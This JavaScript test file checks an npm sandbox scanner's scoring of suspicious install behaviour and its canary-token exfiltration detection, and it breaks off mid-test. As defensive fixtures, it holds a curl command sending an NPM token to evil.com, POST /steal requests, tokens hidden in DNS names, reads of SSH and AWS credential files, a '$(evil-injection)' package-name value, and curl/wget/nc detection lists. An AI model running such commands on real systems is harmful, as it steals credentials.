const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const {
  test, asyncTest, assert, assertIncludes, assertNotIncludes,
  runScan, runCommand, BIN, TESTS_DIR, addSkipped
} = require('../test-utils');

async function runSandboxTests() {
  // ============================================
  // SANDBOX NETWORK TESTS
  // ============================================

  console.log('\n=== SANDBOX NETWORK TESTS ===\n');

  const {
    scoreFindings,
    generateNetworkReport,
    EXFIL_PATTERNS,
    SAFE_DOMAINS,
    TIME_OFFSETS
  } = require('../../src/sandbox/index.js');

  test('SANDBOX-NET: scoreFindings handles empty report', () => {
    const { score, findings } = scoreFindings({});
    assert(score === 0, 'Empty report should score 0');
    assert(findings.length === 0, 'Empty report should have no findings');
  });

  test('SANDBOX-NET: scoreFindings detects suspicious DNS (unknown domain → network outlier)', () => {
    const report = { network: { dns_queries: ['evil.com', 'registry.npmjs.org'] } };
    const { score, findings } = scoreFindings(report);
    assert(score > 0, 'Should score > 0 for evil.com DNS');
    const dnsFindings = findings.filter(f => f.type === 'sandbox_network_outlier');
    assert(dnsFindings.length === 1, 'Should have 1 network outlier (evil.com), got ' + dnsFindings.length);
    assert(dnsFindings[0].evidence === 'evil.com', 'Should flag evil.com');
  });

  test('SANDBOX-NET: scoreFindings skips safe domains in DNS', () => {
    const report = { network: { dns_queries: ['registry.npmjs.org', 'github.com', 'npmjs.com'] } };
    const { score } = scoreFindings(report);
    assert(score === 0, 'All safe domains should score 0');
  });

  test('SANDBOX-NET: scoreFindings detects DNS resolutions (INFO)', () => {
    const report = { network: { dns_resolutions: [
      { domain: 'evil.com', ip: '1.2.3.4' },
      { domain: 'registry.npmjs.org', ip: '5.6.7.8' }
    ] } };
    const { findings } = scoreFindings(report);
    const resFindings = findings.filter(f => f.type === 'dns_resolution');
    assert(resFindings.length === 1, 'Should have 1 dns_resolution finding for evil.com');
    assert(resFindings[0].severity === 'INFO', 'DNS resolution should be INFO severity');
  });

  test('SANDBOX-NET: scoreFindings detects suspicious TLS', () => {
    const report = { network: { tls_connections: [
      { domain: 'evil.com', ip: '1.2.3.4', port: 443 },
      { domain: 'registry.npmjs.org', ip: '5.6.7.8', port: 443 }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score > 0, 'Should score > 0 for evil.com TLS');
    const tlsFindings = findings.filter(f => f.type === 'suspicious_tls');
    assert(tlsFindings.length === 1, 'Should have 1 suspicious TLS');
    assert(tlsFindings[0].evidence === 'evil.com', 'Should flag evil.com');
  });

  test('SANDBOX-NET: scoreFindings detects data exfiltration', () => {
    const report = { network: { http_bodies: ['{"npmrc":"//registry.npmjs.org/:_authToken=abc123"}'] } };
    const { score, findings } = scoreFindings(report);
    assert(score >= 50, 'Exfiltration should score >= 50');
    const exfilFindings = findings.filter(f => f.type === 'data_exfiltration');
    assert(exfilFindings.length >= 1, 'Should detect exfiltration');
    assert(exfilFindings[0].severity === 'CRITICAL', 'Exfiltration should be CRITICAL');
  });

  test('SANDBOX-NET: scoreFindings detects multiple exfiltration patterns', () => {
    const report = { network: { http_bodies: [
      'token=secret123',
      'AWS_SECRET_ACCESS_KEY=abc',
      'normal body content'
    ] } };
    const { findings } = scoreFindings(report);
    const exfilFindings = findings.filter(f => f.type === 'data_exfiltration');
    assert(exfilFindings.length === 2, 'Should detect 2 exfiltrations, got ' + exfilFindings.length);
  });

  test('SANDBOX-NET: scoreFindings detects HTTP requests to non-safe hosts', () => {
    const report = { network: { http_requests: [
      { method: 'POST', host: 'evil.com', path: '/steal' },
      { method: 'GET', host: 'registry.npmjs.org', path: '/lodash' }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score > 0, 'Should score > 0');
    const httpFindings = findings.filter(f => f.type === 'suspicious_http_request');
    assert(httpFindings.length === 1, 'Should detect 1 suspicious HTTP request (unknown domain)');
    assert(httpFindings[0].detail.includes('POST evil.com'), 'Should flag POST to evil.com');
  });

  test('SANDBOX-NET: scoreFindings detects blocked connections', () => {
    const report = { network: { blocked_connections: [
      { ip: '1.2.3.4', port: 8080 },
      { ip: '5.6.7.8', port: 443 }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score >= 60, 'Blocked connections should score >= 60, got ' + score);
    const blockedFindings = findings.filter(f => f.type === 'blocked_connection');
    assert(blockedFindings.length === 2, 'Should have 2 blocked connection findings');
  });

  test('SANDBOX-NET: scoreFindings caps at 100', () => {
    const report = {
      sensitive_files: { read: ['/root/.npmrc', '/root/.ssh/id_rsa', '/root/.aws/credentials'] },
      network: {
        dns_queries: ['evil1.com', 'evil2.com'],
        http_bodies: ['token=abc', 'password=123'],
        blocked_connections: [{ ip: '1.2.3.4', port: 80 }]
      }
    };
    const { score } = scoreFindings(report);
    assert(score === 100, 'Score should cap at 100, got ' + score);
  });

  test('SANDBOX-NET: generateNetworkReport returns string with sections', () => {
    const report = {
      package: 'test-pkg',
      timestamp: '2025-01-01T00:00:00Z',
      mode: 'permissive',
      duration_ms: 5000,
      network: {
        dns_resolutions: [{ domain: 'evil.com', ip: '1.2.3.4' }],
        http_requests: [{ method: 'GET', host: 'evil.com', path: '/data' }],
        tls_connections: [{ domain: 'evil.com', ip: '1.2.3.4', port: 443 }],
        http_connections: [{ host: '1.2.3.4', port: 443, protocol: 'TCP' }],
        blocked_connections: [],
        http_bodies: []
      }
    };
    const output = generateNetworkReport(report);
    assert(typeof output === 'string', 'Should return a string');
    assert(output.includes('test-pkg'), 'Should include package name');
    assert(output.includes('DNS Resolutions'), 'Should have DNS section');
    assert(output.includes('HTTP Requests'), 'Should have HTTP section');
    assert(output.includes('TLS Connections'), 'Should have TLS section');
    assert(output.includes('evil.com'), 'Should include domain');
  });

  test('SANDBOX-NET: generateNetworkReport shows blocked in strict mode', () => {
    const report = {
      package: 'test-pkg',
      timestamp: '2025-01-01T00:00:00Z',
      mode: 'strict',
      duration_ms: 3000,
      network: {
        dns_resolutions: [],
        http_requests: [],
        tls_connections: [],
        http_connections: [],
        blocked_connections: [{ ip: '1.2.3.4', port: 8080 }],
        http_bodies: []
      }
    };
    const output = generateNetworkReport(report);
    assert(output.includes('STRICT'), 'Should show STRICT mode');
    assert(output.includes('Blocked Connections'), 'Should have blocked section');
    assert(output.includes('1.2.3.4'), 'Should include blocked IP');
  });

  test('SANDBOX-NET: generateNetworkReport shows exfiltration alerts', () => {
    const report = {
      package: 'test-pkg',
      timestamp: '2025-01-01T00:00:00Z',
      mode: 'permissive',
      duration_ms: 3000,
      network: {
        dns_resolutions: [],
        http_requests: [],
        tls_connections: [],
        http_connections: [],
        blocked_connections: [],
        http_bodies: ['NPM_TOKEN=secret123']
      }
    };
    const output = generateNetworkReport(report);
    assert(output.includes('Data Exfiltration'), 'Should have exfil section');
    assert(output.includes('npm token'), 'Should identify npm token');
  });

  test('SANDBOX-NET: EXFIL_PATTERNS is an array with entries', () => {
    assert(Array.isArray(EXFIL_PATTERNS), 'Should be an array');
    assert(EXFIL_PATTERNS.length >= 8, 'Should have at least 8 patterns');
    for (const p of EXFIL_PATTERNS) {
      assert(p.pattern instanceof RegExp, 'Each should have a pattern regex');
      assert(typeof p.label === 'string', 'Each should have a label');
      assert(typeof p.severity === 'string', 'Each should have a severity');
    }
  });

  test('SANDBOX-NET: SAFE_DOMAINS includes essential domains', () => {
    assert(SAFE_DOMAINS.includes('registry.npmjs.org'), 'Should include registry.npmjs.org');
    assert(SAFE_DOMAINS.includes('github.com'), 'Should include github.com');
    assert(SAFE_DOMAINS.includes('npmjs.org'), 'Should include npmjs.org');
  });

  test('SANDBOX-NET: CLI --strict flag is accepted', () => {
    const output = runCommand('sandbox --strict');
    assertIncludes(output, 'Usage', 'Should show sandbox usage (no package)');
  });

  test('SANDBOX-NET: CLI sandbox-report without package shows usage', () => {
    const output = runCommand('sandbox-report');
    assertIncludes(output, 'Usage', 'Should show sandbox-report usage');
  });

  test('SANDBOX-NET: CLI sandbox-report with package runs', () => {
    const output = runCommand('sandbox-report nonexistent-pkg-test');
    assert(output.length > 0, 'Should produce output');
  });

  // ============================================
  // SANDBOX COVERAGE TESTS (sandbox.js)
  // ============================================

  console.log('\n=== SANDBOX COVERAGE TESTS ===\n');

  test('SANDBOX-COV: scoreFindings detects sensitive file reads (credential)', () => {
    const report = { sensitive_files: { read: ['/root/.npmrc', '/home/user/.ssh/id_rsa'] } };
    const { score, findings } = scoreFindings(report);
    assert(score >= 80, 'Credential file reads should score >= 80, got ' + score);
    const credFindings = findings.filter(f => f.type === 'sensitive_file_read' && f.severity === 'CRITICAL');
    assert(credFindings.length === 2, 'Should have 2 CRITICAL file read findings');
  });

  test('SANDBOX-COV: scoreFindings detects sensitive file reads (system)', () => {
    const report = { sensitive_files: { read: ['/etc/passwd'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 25, 'System file read should score 25, got ' + score);
    assert(findings[0].severity === 'HIGH', 'Should be HIGH severity');
  });

  test('SANDBOX-COV: scoreFindings detects sensitive file reads (config)', () => {
    const report = { sensitive_files: { read: ['/home/user/.env', '/home/user/.gitconfig'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 30, 'Config file reads should score 30, got ' + score);
    assert(findings[0].severity === 'MEDIUM', 'Should be MEDIUM severity');
  });

  test('SANDBOX-COV: scoreFindings detects sensitive file writes (credential)', () => {
    const report = { sensitive_files: { written: ['/root/.npmrc'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 40, 'Credential file write should score 40, got ' + score);
    const wf = findings.filter(f => f.type === 'sensitive_file_write');
    assert(wf.length === 1 && wf[0].severity === 'CRITICAL', 'Should be CRITICAL write');
  });

  test('SANDBOX-COV: scoreFindings detects sensitive file writes (system)', () => {
    const report = { sensitive_files: { written: ['/etc/passwd'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 25, 'System file write should score 25, got ' + score);
    assert(findings[0].severity === 'HIGH', 'Should be HIGH severity');
  });

  test('SANDBOX-COV: scoreFindings detects sensitive file writes (other)', () => {
    const report = { sensitive_files: { written: ['/tmp/somefile'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 15, 'Other file write should score 15, got ' + score);
    assert(findings[0].severity === 'MEDIUM', 'Should be MEDIUM severity');
  });

  test('SANDBOX-COV: scoreFindings detects filesystem changes (system path)', () => {
    const report = { filesystem: { created: ['/usr/bin/backdoor'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 50, 'System path creation should score 50, got ' + score);
    assert(findings[0].severity === 'CRITICAL', 'Should be CRITICAL');
  });

  test('SANDBOX-COV: scoreFindings detects filesystem changes (crontab)', () => {
    const report = { filesystem: { created: ['/etc/cron.d/evil'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 50, 'Crontab creation should score 50, got ' + score);
  });

  test('SANDBOX-COV: scoreFindings detects filesystem changes (/tmp)', () => {
    const report = { filesystem: { created: ['/tmp/payload.sh'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 30, '/tmp creation should score 30, got ' + score);
    assert(findings[0].severity === 'HIGH', 'Should be HIGH');
  });

  test('SANDBOX-COV: scoreFindings detects suspicious processes (dangerous cmd)', () => {
    const report = { processes: { spawned: [{ command: '/usr/bin/curl' }] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 40, 'Dangerous cmd should score 40, got ' + score);
    assert(findings[0].type === 'suspicious_process', 'Should be suspicious_process');
    assert(findings[0].severity === 'CRITICAL', 'Should be CRITICAL');
  });

  test('SANDBOX-COV: scoreFindings detects unknown processes', () => {
    const report = { processes: { spawned: [{ command: '/opt/unknown-binary' }] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 15, 'Unknown process should score 15, got ' + score);
    assert(findings[0].type === 'unknown_process', 'Should be unknown_process');
    assert(findings[0].severity === 'MEDIUM', 'Should be MEDIUM');
  });

  test('SANDBOX-COV: scoreFindings skips safe sandbox commands (timeout, node, npm)', () => {
    const report = { processes: { spawned: [
      { command: '/usr/bin/timeout' },
      { command: '/usr/local/bin/node' },
      { command: '/usr/local/bin/npm' },
      { command: '/usr/bin/npx' },
      { command: '/usr/bin/su' },
      { command: '/usr/bin/env' }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 0, 'Safe sandbox cmds should score 0, got ' + score);
    assert(findings.length === 0, 'Should have no findings for safe sandbox cmds');
  });

  test('SANDBOX-COV: scoreFindings skips safe IPs in connections', () => {
    const report = { network: { http_connections: [
      { host: '127.0.0.1', port: 3000 }
    ] } };
    const { score } = scoreFindings(report);
    assert(score === 0, 'Safe IP should score 0, got ' + score);
  });

  test('SANDBOX-COV: scoreFindings skips probe ports in connections', () => {
    const report = { network: { http_connections: [
      { host: '1.2.3.4', port: 65535 }
    ] } };
    const { score } = scoreFindings(report);
    assert(score === 0, 'Probe port should score 0, got ' + score);
  });

  test('SANDBOX-COV: scoreFindings detects suspicious TCP connections', () => {
    const report = { network: { http_connections: [
      { host: '1.2.3.4', port: 8080 }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 25, 'Suspicious TCP should score 25, got ' + score);
    assert(findings[0].type === 'suspicious_connection', 'Should be suspicious_connection');
  });

  test('SANDBOX-COV: scoreFindings detects .aws credential read', () => {
    const report = { sensitive_files: { read: ['/root/.aws/credentials'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 40, '.aws read should score 40, got ' + score);
    assert(findings[0].severity === 'CRITICAL', 'Should be CRITICAL');
  });

  test('SANDBOX-COV: scoreFindings detects .bash_history read', () => {
    const report = { sensitive_files: { read: ['/home/user/.bash_history'] } };
    const { score } = scoreFindings(report);
    assert(score === 15, '.bash_history read should score 15, got ' + score);
  });

  test('SANDBOX-COV: scoreFindings with /etc/shadow write', () => {
    const report = { sensitive_files: { written: ['/etc/shadow'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 25, '/etc/shadow write should score 25, got ' + score);
    assert(findings[0].severity === 'HIGH', 'Should be HIGH');
  });

  test('SANDBOX-COV: scoreFindings with .aws credential write', () => {
    const report = { sensitive_files: { written: ['/root/.aws/credentials'] } };
    const { score } = scoreFindings(report);
    assert(score === 40, '.aws write should score 40, got ' + score);
  });

  test('SANDBOX-COV: scoreFindings with /etc/shadow read', () => {
    const report = { sensitive_files: { read: ['/etc/shadow'] } };
    const { score } = scoreFindings(report);
    assert(score === 25, '/etc/shadow read should score 25, got ' + score);
  });

  test('SANDBOX-COV: generateNetworkReport with no DNS, no HTTP, no TLS', () => {
    const report = {
      package: 'clean-pkg',
      timestamp: '2025-01-01T00:00:00Z',
      mode: 'permissive',
      duration_ms: 1000,
      network: { dns_resolutions: [], http_requests: [], tls_connections: [], http_connections: [], blocked_connections: [], http_bodies: [] }
    };
    const output = generateNetworkReport(report);
    assert(output.includes('No DNS resolutions captured'), 'Should show no DNS message');
    assert(output.includes('No HTTP requests captured'), 'Should show no HTTP message');
    assert(output.includes('No TLS connections captured'), 'Should show no TLS message');
  });

  test('SANDBOX-COV: generateNetworkReport shows safe vs suspicious domains', () => {
    const report = {
      package: 'mixed-pkg',
      timestamp: '2025-01-01T00:00:00Z',
      mode: 'permissive',
      duration_ms: 2000,
      network: {
        dns_resolutions: [
          { domain: 'registry.npmjs.org', ip: '1.2.3.4' },
          { domain: 'evil.com', ip: '5.6.7.8' }
        ],
        http_requests: [
          { method: 'GET', host: 'registry.npmjs.org', path: '/pkg' },
          { method: 'POST', host: 'evil.com', path: '/steal' }
        ],
        tls_connections: [
          { domain: 'registry.npmjs.org', ip: '1.2.3.4', port: 443 },
          { domain: 'evil.com', ip: '5.6.7.8', port: 443 }
        ],
        http_connections: [
          { host: 'registry.npmjs.org', port: 443, protocol: 'TCP' },
          { host: '5.6.7.8', port: 443, protocol: 'TCP' }
        ],
        blocked_connections: [],
        http_bodies: []
      }
    };
    const output = generateNetworkReport(report);
    assert(output.includes('[OK]'), 'Should show OK for safe domains');
    assert(output.includes('[!!]'), 'Should show !! for suspicious domains');
    assert(output.includes('Raw TCP Connections'), 'Should have raw TCP section');
  });

  test('SANDBOX-COV: scoreFindings multiple dangerous processes', () => {
    const report = { processes: { spawned: [
      { command: 'curl' },
      { command: 'wget' },
      { command: 'nc' },
      { command: '' }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 100, 'Multiple dangerous cmds should cap at 100, got ' + score);
    const procFindings = findings.filter(f => f.type === 'suspicious_process');
    assert(procFindings.length === 3, 'Should have 3 dangerous process findings');
  });

  // Test getSeverity, displayResults, imageExists (now exported)
  const { getSeverity, displayResults, imageExists, isDockerAvailable, buildSandboxImage } = require('../../src/sandbox/index.js');

  test('SANDBOX-COV: getSeverity returns CLEAN for 0', () => {
    assert(getSeverity(0) === 'CLEAN', 'Score 0 should be CLEAN');
  });

  test('SANDBOX-COV: getSeverity returns LOW for 1-20', () => {
    assert(getSeverity(10) === 'LOW', 'Score 10 should be LOW');
    assert(getSeverity(20) === 'LOW', 'Score 20 should be LOW');
  });

  test('SANDBOX-COV: getSeverity returns MEDIUM for 21-50', () => {
    assert(getSeverity(30) === 'MEDIUM', 'Score 30 should be MEDIUM');
    assert(getSeverity(50) === 'MEDIUM', 'Score 50 should be MEDIUM');
  });

  test('SANDBOX-COV: getSeverity returns HIGH for 51-80', () => {
    assert(getSeverity(60) === 'HIGH', 'Score 60 should be HIGH');
    assert(getSeverity(80) === 'HIGH', 'Score 80 should be HIGH');
  });

  test('SANDBOX-COV: getSeverity returns CRITICAL for 81+', () => {
    assert(getSeverity(81) === 'CRITICAL', 'Score 81 should be CRITICAL');
    assert(getSeverity(100) === 'CRITICAL', 'Score 100 should be CRITICAL');
  });

  test('SANDBOX-COV: displayResults with no findings', () => {
    const origLog = console.log;
    const logs = [];
    console.log = (msg) => logs.push(msg);
    try {
      displayResults({ score: 0, severity: 'CLEAN', findings: [] });
    } finally {
      console.log = origLog;
    }
    assert(logs.some(l => l.includes('0/100')), 'Should show score');
    assert(logs.some(l => l.includes('No suspicious')), 'Should say no suspicious behavior');
  });

  test('SANDBOX-COV: displayResults with findings', () => {
    const origLog = console.log;
    const logs = [];
    console.log = (msg) => logs.push(msg);
    try {
      displayResults({
        score: 85,
        severity: 'CRITICAL',
        findings: [
          { type: 'sensitive_file_read', severity: 'CRITICAL', detail: 'Read .npmrc' },
          { type: 'dns_resolution', severity: 'INFO', detail: 'some.domain \u2192 1.2.3.4' },
          { type: 'suspicious_process', severity: 'HIGH', detail: 'curl detected' }
        ]
      });
    } finally {
      console.log = origLog;
    }
    assert(logs.some(l => l.includes('85/100')), 'Should show score');
    assert(logs.some(l => l.includes('2 finding(s)')), 'Should count actionable (non-INFO) findings');
  });

  test('SANDBOX-COV: imageExists returns boolean', () => {
    const result = imageExists();
    assert(typeof result === 'boolean', 'imageExists should return a boolean, got ' + typeof result);
  });

  test('SANDBOX-COV: isDockerAvailable returns boolean', () => {
    const result = isDockerAvailable();
    assert(typeof result === 'boolean', 'isDockerAvailable should return a boolean, got ' + typeof result);
  });

  await asyncTest('SANDBOX-COV: buildSandboxImage returns boolean', async () => {
    const origLog = console.log;
    console.log = () => {};
    try {
      const result = await buildSandboxImage();
      assert(typeof result === 'boolean', 'buildSandboxImage should return a boolean');
    } finally {
      console.log = origLog;
    }
  });

  await asyncTest('SANDBOX-COV: runSandbox with invalid package name returns clean', async () => {
    const origLog = console.log;
    console.log = () => {};
    try {
      const { runSandbox } = require('../../src/sandbox/index.js');
      const result = await runSandbox('$(evil-injection)', {});
      assert(result.score === 0, 'Invalid name should return score 0');
      assert(result.severity === 'CLEAN', 'Should be CLEAN');
    } finally {
      console.log = origLog;
    }
  });

  test('SANDBOX-COV: generateNetworkReport with TLS connections', () => {
    const report = {
      package: 'test-pkg', mode: 'strict', timestamp: '2025-01-01T00:00:00Z', duration_ms: 5000,
      network: {
        tls_connections: [
          { domain: 'registry.npmjs.org', ip: '104.16.0.1', port: 443 },
          { domain: 'evil.com', ip: '6.6.6.6', port: 443 }
        ],
        http_connections: [
          { host: 'registry.npmjs.org', port: 443, protocol: 'https' },
          { host: '8.8.8.8', port: 80, protocol: 'http' }
        ]
      }
    };
    const out = generateNetworkReport(report);
    assertIncludes(out, 'TLS Connections (2)', 'Should show TLS section');
    assertIncludes(out, 'evil.com', 'Should show suspicious TLS domain');
    assertIncludes(out, 'Raw TCP Connections', 'Should show TCP connections section');
  });

  // ============================================
  // SANDBOX CANARY TOKEN TESTS
  // ============================================

  console.log('\n=== SANDBOX CANARY TOKEN TESTS ===\n');

  const {
    generateCanaryTokens: genTokens,
    detectCanaryExfiltration,
    detectCanaryInOutput
  } = require('../../src/canary-tokens.js');
  const { getRule } = require('../../src/rules/index.js');
  const { getPlaybook } = require('../../src/response/playbooks.js');

  test('SANDBOX-CANARY: generateCanaryTokens produces format-valid tokens', () => {
    const { tokens, suffix } = genTokens();
    assert(typeof suffix === 'string' && suffix.length > 0, 'Should have a suffix');
    assert(Object.keys(tokens).length === 8, 'Should have 8 tokens');
    assert(tokens.GITHUB_TOKEN.startsWith('ghp_'), 'GITHUB_TOKEN should start with ghp_');
    assert(tokens.NPM_TOKEN.startsWith('npm_'), 'NPM_TOKEN should start with npm_');
    assert(tokens.AWS_ACCESS_KEY_ID.startsWith('AKIA'), 'AWS_ACCESS_KEY_ID should start with AKIA');
    assert(tokens.GITLAB_TOKEN.startsWith('glpat-'), 'GITLAB_TOKEN should start with glpat-');
    assert(tokens.DOCKER_PASSWORD.startsWith('dckr_pat_'), 'DOCKER_PASSWORD should start with dckr_pat_');
    for (const value of Object.values(tokens)) {
      assert(!value.includes('MUADDIB'), 'Token should NOT contain MUADDIB: ' + value);
      assert(!value.includes('CANARY'), 'Token should NOT contain CANARY: ' + value);
    }
  });

  test('SANDBOX-CANARY: detectCanaryExfiltration finds token in HTTP body', () => {
    const { tokens } = genTokens();
    const networkLogs = {
      http_bodies: ['POST stolen=' + tokens.GITHUB_TOKEN + '&done=1'],
      dns_queries: [],
      http_requests: [],
      tls_connections: []
    };
    const result = detectCanaryExfiltration(networkLogs, tokens);
    assert(result.detected === true, 'Should detect exfiltration');
    assert(result.exfiltrations.length >= 1, 'Should have at least 1 exfiltration');
    assert(result.exfiltrations[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
    assert(result.exfiltrations[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
  });

  test('SANDBOX-CANARY: detectCanaryInOutput finds token in process output', () => {
    const { tokens } = genTokens();
    const result = detectCanaryInOutput('sending ' + tokens.NPM_TOKEN, '', tokens);
    assert(result.detected === true, 'Should detect in stdout');
    assert(result.exfiltrations[0].token === 'NPM_TOKEN', 'Should identify NPM_TOKEN');
  });

  test('SANDBOX-CANARY: Rule MUADDIB-CANARY-001 exists', () => {
    const rule = getRule('canary_exfiltration');
    assert(rule.id === 'MUADDIB-CANARY-001', 'Rule ID should be MUADDIB-CANARY-001');
    assert(rule.severity === 'CRITICAL', 'Severity should be CRITICAL');
    assertIncludes(rule.description, 'honey tokens', 'Description should mention honey tokens');
  });

  test('SANDBOX-CANARY: Playbook for canary_exfiltration exists', () => {
    const playbook = getPlaybook('canary_exfiltration');
    assertIncludes(playbook, 'CRITIQUE', 'Playbook should contain CRITIQUE');
    assertIncludes(playbook, 'honey tokens', 'Playbook should mention honey tokens');
    assertIncludes(playbook, 'malveillant', 'Playbook should mention malveillant');
  });

  // ============================================
  // STATIC CANARY TOKEN TESTS
  // ============================================

  console.log('\n=== STATIC CANARY TOKEN TESTS ===\n');

  const {
    STATIC_CANARY_TOKENS,
    detectStaticCanaryExfiltration
  } = require('../../src/sandbox/index.js');

  test('STATIC-CANARY: STATIC_CANARY_TOKENS has 6 entries with format-valid values', () => {
    const keys = Object.keys(STATIC_CANARY_TOKENS);
    assert(keys.length === 6, 'Should have 6 static canary tokens, got ' + keys.length);
    assert(STATIC_CANARY_TOKENS.GITHUB_TOKEN.startsWith('ghp_'), 'GITHUB_TOKEN should start with ghp_');
    assert(STATIC_CANARY_TOKENS.NPM_TOKEN.startsWith('npm_'), 'NPM_TOKEN should start with npm_');
    assert(STATIC_CANARY_TOKENS.AWS_ACCESS_KEY_ID.startsWith('AKIA'), 'AWS_ACCESS_KEY_ID should start with AKIA');
    for (const [key, value] of Object.entries(STATIC_CANARY_TOKENS)) {
      assert(!value.includes('MUADDIB'), `Token ${key} should NOT contain MUADDIB`);
    }
  });

  test('STATIC-CANARY: STATIC_CANARY_TOKENS has expected keys', () => {
    const expected = ['GITHUB_TOKEN', 'NPM_TOKEN', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'SLACK_WEBHOOK_URL', 'DISCORD_WEBHOOK_URL'];
    for (const key of expected) {
      assert(STATIC_CANARY_TOKENS[key] !== undefined, `Missing key: ${key}`);
    }
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in http_bodies', () => {
    const report = { network: { http_bodies: ['stolen=' + STATIC_CANARY_TOKENS.GITHUB_TOKEN] } };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect exfiltration');
    assert(result[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
    assert(result[0].value === STATIC_CANARY_TOKENS.GITHUB_TOKEN, 'Should return the token value');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in dns_queries', () => {
    const report = { network: { dns_queries: [STATIC_CANARY_TOKENS.NPM_TOKEN + '.evil.com'] } };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect DNS exfiltration');
    assert(result[0].token === 'NPM_TOKEN', 'Should identify NPM_TOKEN');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in http_requests', () => {
    const report = { network: { http_requests: [
      { method: 'GET', host: 'evil.com', path: '/steal?key=' + STATIC_CANARY_TOKENS.AWS_ACCESS_KEY_ID }
    ] } };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect URL exfiltration');
    assert(result[0].token === 'AWS_ACCESS_KEY_ID', 'Should identify AWS_ACCESS_KEY_ID');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in tls_connections', () => {
    const report = { network: { tls_connections: [
      { domain: STATIC_CANARY_TOKENS.DISCORD_WEBHOOK_URL + '.evil.com', ip: '1.2.3.4', port: 443 }
    ] } };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect TLS exfiltration');
    assert(result[0].token === 'DISCORD_WEBHOOK_URL', 'Should identify DISCORD_WEBHOOK_URL');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in install_output', () => {
    const report = { install_output: 'sending ' + STATIC_CANARY_TOKENS.AWS_SECRET_ACCESS_KEY };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect install output exfiltration');
    assert(result[0].token === 'AWS_SECRET_ACCESS_KEY', 'Should identify AWS_SECRET_ACCESS_KEY');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in filesystem.created', () => {
    const report = { filesystem: { created: ['/tmp/' + STATIC_CANARY_TOKENS.SLACK_WEBHOOK_URL] } };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect filesystem exfiltration');
    assert(result[0].token === 'SLACK_WEBHOOK_URL', 'Should identify SLACK_WEBHOOK_URL');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in processes.spawned', () => {
    const report = { processes: { spawned: [
      { command: 'curl http://evil.com/?t=' + STATIC_CANARY_TOKENS.NPM_TOKEN, pid: 1 }
    ] } };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect process exfiltration');
    assert(result[0].token === 'NPM_TOKEN', 'Should identify NPM_TOKEN');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration returns empty for clean report', () => {
    const report = {
      network: { http_bodies: ['normal data'], dns_queries: ['google.com'], http_requests: [], tls_connections: [] },
      filesystem: { created: [] },
      processes: { spawned: [] },
      install_output: 'npm WARN deprecated'
    };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length === 0, 'Should return empty for clean report');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration handles null report', () => {
    const result = detectStaticCanaryExfiltration(null);
    assert(result.length === 0, 'Should return empty for null report');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration handles empty report', () => {
    const result = detectStaticCanaryExfiltration({});
    assert(result.length === 0, 'Should return empty for empty report');
  });

  test('STATIC-CANARY: detectStaticCanaryExfiltration detects multiple tokens at once', () => {
    const report = { network: {
      http_bodies: ['token=' + STATIC_CANARY_TOKENS.GITHUB_TOKEN + '&secret=' + STATIC_CANARY_TOKENS.AWS_SECRET_ACCESS_KEY]
    } };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 2, 'Should detect 2+ tokens, got ' + result.length);
    const tokenNames = result.map(r => r.token);
    assert(tokenNames.includes('GITHUB_TOKEN'), 'Should include GITHUB_TOKEN');
    assert(tokenNames.includes('AWS_SECRET_ACCESS_KEY'), 'Should include AWS_SECRET_ACCESS_KEY');
  });

  test('STATIC-CANARY: canary_exfiltration finding adds +50 to score', () => {
    // Verify the scoring logic: scoreFindings returns base score,
    // then canary_exfiltration findings add +50 each in runSandbox
    const baseReport = { network: { dns_queries: ['evil.com'] } };
    const { score: baseScore } = scoreFindings(baseReport);
    assert(baseScore === 20, 'Base DNS score should be 20, got ' + baseScore);
    // In runSandbox, if a canary is also found, finalScore = baseScore + 50 = 70
    const mockFindings = [
      { type: 'sandbox_network_outlier', severity: 'HIGH', detail: 'DNS to evil.com', evidence: 'evil.com' },
      { type: 'canary_exfiltration', severity: 'CRITICAL', detail: 'Token stolen', evidence: 'ghp_R8kLmN2pQ4vW7xY9aB3cD5eF6gH8jK0mN2pQ4vW' }
    ];
